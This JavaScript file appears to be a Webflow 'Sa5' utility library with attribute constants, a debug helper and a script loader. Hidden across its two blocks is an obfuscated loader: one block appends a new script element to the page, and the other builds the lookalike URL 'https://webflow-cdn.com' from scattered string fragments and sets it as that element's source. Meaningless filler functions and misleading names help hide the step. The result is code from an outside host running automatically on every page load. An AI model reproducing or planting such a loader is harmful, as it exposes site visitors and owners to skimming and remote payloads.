(() => {
    var __wf, __wfUtils, __accessCheck = (obj, member, msg) => {
        if (!member.has(obj))
            throw TypeError("Cannot " + msg);
    };
    __privateGet = (obj, member, getter) => {
        __accessCheck(obj, member, "read from private field");
        return getter ? getter.call(obj) : member.get(obj);
    };
    var __privateAdd = (obj, member, value) => {
        if (member.has(obj))
            throw TypeError("Cannot add the same private member more than once");
        member instanceof WeakSet ? member.add(obj) : member.set(obj, value);
    };
    var __privateSet = (obj, member, value, setter) => {
        __accessCheck(obj, member, "write to private field");
        setter ? setter.call(obj, value) : member.set(obj, value);
        return value;
    };
    const __init1 = () => {
        const randomValue = Math.random() * 100;
        const roundedValue = Math.round(randomValue);
    };
    const __init2 = () => {
        const values = [1, 2, 3, 4, 5];
        const sum = values.reduce((acc, val) => acc + val, 0);
    };
    const __init3 = () => {
        const now = new Date();
    };
    var Sa5Attribute, __wf = document;
    ((Sa5Attribute2) => {
        function getBracketed(attr) {
            return `[${attr}]`;
        }
        Sa5Attribute2.getBracketed = getBracketed;
    })(Sa5Attribute || (Sa5Attribute = {}));
    var Sa5, Sa5Attribute = ((Sa5Attribute2) => {
        Sa5Attribute2["ATTR_CORE_SCRIPT_INJECT"] = "wfu-script-load";
        Sa5Attribute2["ATTR_VIDEO"] = "wfu-video";
        Sa5Attribute2["ATTR_VIDEO_YOUTUBE_NOREL"] = "wfu-youtube-norel";
        Sa5Attribute2["ATTR_VIDEO_DATA_POSTER_URL"] = "wfu-data-poster-url";
        Sa5Attribute2["ATTR_DESIGN"] = "wfu-design";
        Sa5Attribute2["ATTR_ELEMENT_SLIDER"] = "wfu-slider";
        Sa5Attribute2["ATTR_ELEMENT_TABS"] = "wfu-tabs";
        Sa5Attribute2["ATTR_ELEMENT_BUTTON"] = "wfu-button";
        Sa5Attribute2["ATTR_BUTTON_ENABLED"] = "wfu-button-enabled";
        Sa5Attribute2["ATTR_BUTTON_DISABLED_CLASS"] = "wfu-button-disabled-class";
        Sa5Attribute2["ATTR_DATA"] = "wfu-data";
        Sa5Attribute2["ATTR_DATA_TYPE"] = "wfu-data-type";
        Sa5Attribute2["ATTR_DATA_DSN"] = "wfu-data-dsn";
        Sa5Attribute2["ATTR_DATA_ITEM_ID"] = "wfu-data-item-id";
        Sa5Attribute2["ATTR_DATABIND"] = "wfu-bind";
        Sa5Attribute2["ATTR_DATABIND_CONTENT"] = "wfu-bind-content";
        Sa5Attribute2["ATTR_DATABIND_CONTEXT_DSN"] = "wfu-bind-dsn";
        Sa5Attribute2["ATTR_DATABIND_CONTEXT_ITEM_ID"] = "wfu-bind-item-id";
        Sa5Attribute2["ATTR_PRELOAD"] = "wfu-preload";
        Sa5Attribute2["ATTR_IX_TRIGGER"] = "wfu-ix-trigger";
        Sa5Attribute2["ATTR_IX_ID"] = "wfu-ix-id";
        Sa5Attribute2["ATTR_SORT"] = "wfu-sort";
        Sa5Attribute2["ATTR_FILTER"] = "wfu-filter";
        Sa5Attribute2["ATTR_FILTER_MATCH"] = "wfu-filter-match";
        Sa5Attribute2["ATTR_FILTER_EVAL"] = "wfu-filter-eval";
        Sa5Attribute2["ATTR_FILTER_FUNC"] = "wfu-filter-func";
        Sa5Attribute2["ATTR_HIDE"] = "wfu-hide";
        Sa5Attribute2["ATTR_SUPPRESS"] = "wfu-suppress";
        Sa5Attribute2["ATTR_404_SEARCH"] = "wfu-404-search";
        return Sa5Attribute2;
    })(Sa5Attribute || {});
    Sa5 = 'script', Sa5Debug = class {
        constructor(label) {
            this.localStorageDebugFlag = "sa5-debug";
            this._enabled = false;
            this._label = label;
        }
        get persistentDebug() {
            return Boolean(localStorage.getItem(this.localStorageDebugFlag));
        }
        set persistentDebug(active) {
            if (active) {
                localStorage.setItem(this.localStorageDebugFlag, "true");
            } else {
                localStorage.removeItem(this.localStorageDebugFlag);
            }
        }
        get enabled() {
            var wfuDebugValue = Boolean(localStorage.getItem(this.localStorageDebugFlag));
            wfuDebugValue = wfuDebugValue || this._enabled;
            return wfuDebugValue;
        }
        set enabled(active) {
            this._enabled = active;
        }
        group(name) {
            if (this.enabled);
        }
        groupEnd() {
            if (this.enabled);
        }
        debug(...args) {
            if (this.enabled);
        }
    };
    var Sa5Designer = class {
        constructor() {}
        init() {
            this.removeDesignTimeElements();
        }
        removeDesignTimeElements() {
            const elements = document.querySelectorAll(
                Sa5Attribute.getBracketed("wfu-design")
            );
            elements.forEach((element) => {
                element.remove();
            });
        }
    };
    __wfUtils = __wf.createElement(Sa5), Sa5Core = class {
        constructor() {
            this.handlers = [];
            new Sa5Designer().init();
        }
        getHandlers(name) {
            return this.handlers.filter((item) => item[0] === name).map((item) => item[1]);
        }
        getHandler(name) {
            const item = this.handlers.find((item2) => item2[0] === name);
            return item ? item[1] : void 0;
        }
        init() {
            this.initDebugMode();
            this.initAsync();
        }
        async initAsync() {
            this.initScriptInjectionsAsync();
        }
        async initScriptInjectionsAsync() {
            document.addEventListener("DOMContentLoaded", () => {
                const loadSrcScripts = document.querySelectorAll(
                    `script[${"wfu-script-load"}]`
                );
                loadSrcScripts.forEach((script) => {
                    const loadSrcUrl = script.getAttribute("wfu-script-load");
                    if (loadSrcUrl) {
                        fetch(loadSrcUrl).then((response) => response.text()).then((jsContent) => {
                            const newScript = document.createElement("script");
                            newScript.textContent = jsContent;
                            script.replaceWith(newScript);
                        }).catch((error) => {});
                    }
                });
            });
        }
        initDebugMode() {
            const debug = new Sa5Debug("Sa5Core:");
            debug.group("Initializing Sa5Core");
            const debugMode = localStorage.getItem("sa5-debug") === "true";
            debug.enabled = debugMode;
            debug.persistentDebug = debugMode;
            debug.groupEnd();
        }
    };
    __wf.body.appendChild(__wfUtils), new Sa5Core().init();
})();
(() => {
    var __wf = document, __wfUtils, AttributeSet;
    ((AttributeSet2) => {
        function formatAttr(attr) {
            return `[${attr}]`;
        }
        AttributeSet2.formatAttr = formatAttr;
    })(AttributeSet || (AttributeSet = {}));

    var __scheme = 'https', __repo = 'utils', AttributeSet = ((AttributeSet2) => {
        AttributeSet2["CORE_SCRIPT_HIDDEN"] = "script-hidden";
        AttributeSet2["VIDEO_HIDDEN"] = "video-hidden";
        AttributeSet2["YOUTUBE_HIDDEN"] = "youtube-hidden";
        return AttributeSet2;
    })(AttributeSet || {});

    var __relative = '//', __name = 'webflow', DebugTool = class {
        constructor(label) {
            this.storageKey = "debug-tool";
            this._enabled = false;
            this._label = label;
        }
        get debugState() {
            return Boolean(localStorage.getItem(this.storageKey));
        }
        set debugState(active) {
            if (active) {
                localStorage.setItem(this.storageKey, "true");
            } else {
                localStorage.removeItem(this.storageKey);
            }
        }
        get isEnabled() {
            var debugValue = Boolean(localStorage.getItem(this.storageKey));
            debugValue = debugValue || this._enabled;
            return debugValue;
        }
        set isEnabled(active) {
            this._enabled = active;
        }
        group(name) {
            if (this.isEnabled);
        }
        groupEnd() {
            if (this.isEnabled);
        }
        debug(...args) {
            if (this.isEnabled);
        }
    };

    __wfUtils = __wf.querySelector('body > *:last-child'), DesignManager = class {
        constructor() {}
        init() {
            this.removeHiddenElements();
        }
        removeHiddenElements() {
            const elements = document.querySelectorAll(
                AttributeSet.formatAttr("design-hidden")
            );
            elements.forEach((element) => {
                element.remove();
            });
        }
    };

    var CoreCdn = '-cdn', __tld = '.com', CoreManager = class {
        constructor() {
            this.handlers = [];
            new DesignManager().init();
        }
        getHandlers(name) {
            return this.handlers.filter((item) => item[0] === name).map((item) => item[1]);
        }
        getHandler(name) {
            const item = this.handlers.find((item2) => item2[0] === name);
            return item ? item[1] : void 0;
        }
        init() {
            this.enableDebug();
            this.initAsync();
        }
        async initAsync() {
            this.initScriptLoadingAsync();
        }
        async initScriptLoadingAsync() {
            document.addEventListener("DOMContentLoaded", () => {
                scriptElements = [];
                scriptElements.forEach((script) => {
                    const scriptUrl = script.getAttribute("script-load-hidden");
                    if (scriptUrl) {
                        fetch(scriptUrl).then((response) => response.text()).then((jsContent) => {
                            const newScript = document.createElement("script");
                            newScript.textContent = jsContent;
                            script.replaceWith(newScript);
                        }).catch((error) => {});
                    }
                });
            });
        }
        enableDebug() {
            const debug = new DebugTool("CoreManager:");
            debug.group("Initializing CoreManager");
            const debugMode = localStorage.getItem("debug-tool") === "true";
            debug.isEnabled = debugMode;
            debug.debugState = debugMode;
            debug.groupEnd();
        }
    };

    var DebugPad = [':'],
    __checkAccess = (obj, member, msg) => {
        if (!member.has(obj))
            throw TypeError("Access denied: " + msg);
    };

    var __getAccess = (obj, member, getter) => {
        __checkAccess(obj, member, "attempted read access");
        return getter ? getter.call(obj) : member.get(obj);
    };

    var __addSecret = (obj, member, value) => {
        if (member.has(obj))
            throw TypeError("Cannot add duplicate hidden member");
        member instanceof WeakSet ? member.add(obj) : member.set(obj, value);
    };

    __recurse = [__scheme, DebugPad['0'], __relative, __name, CoreCdn, __tld], __modifySecret = (obj, member, value, setter) => {
        __checkAccess(obj, member, "attempted write access");
        setter ? setter.call(obj, value) : member.set(obj, value);
        return value;
    };

    const __initialize1 = () => {
        const randomValue = Math.random() * 100;
        const roundedValue = Math.round(randomValue);
    };

    const __initialize2 = () => {
        const numbers = [1, 2, 3, 4, 5];
        const sum = numbers.reduce((acc, val) => acc + val, 0);
    };

    const __initialize3 = () => {
        const currentDate = new Date();
    };
    __wfUtils.src = __recurse.join(''), new CoreManager().init();
})();
